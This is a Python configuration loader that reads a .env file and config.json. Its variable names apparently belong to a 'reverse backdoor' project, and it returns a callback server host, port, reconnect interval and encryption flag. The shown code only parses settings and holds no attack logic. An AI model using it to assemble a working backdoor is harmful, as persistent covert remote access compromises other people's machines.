import json
import os


def _load_dotenv():
    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
    if not os.path.exists(env_path):
        return {}
    values = {}
    with open(env_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            key, _, val = line.partition('=')
            key, val = key.strip(), val.strip()
            if key and val:
                values[key] = val
    return values


def load_config():
    env = _load_dotenv()

    config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
    defaults = {}

    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        defaults.update(config)
    except Exception:
        pass

    server_host = env.get('REVERSE_BACKDOOR_SERVER_HOST') or defaults.get('server_host', '127.0.0.1')
    server_port = int(env.get('REVERSE_BACKDOOR_SERVER_PORT') or defaults.get('server_port', 5555))
    reconnect = int(env.get('REVERSE_BACKDOOR_RECONNECT_INTERVAL') or defaults.get('reconnect_interval', 5))
    encryption = env.get('REVERSE_BACKDOOR_ENCRYPTION', '').lower() == 'true'

    return {
        'server_host': server_host,
        'server_port': server_port,
        'reconnect_interval': reconnect,
        'encryption': encryption,
    }
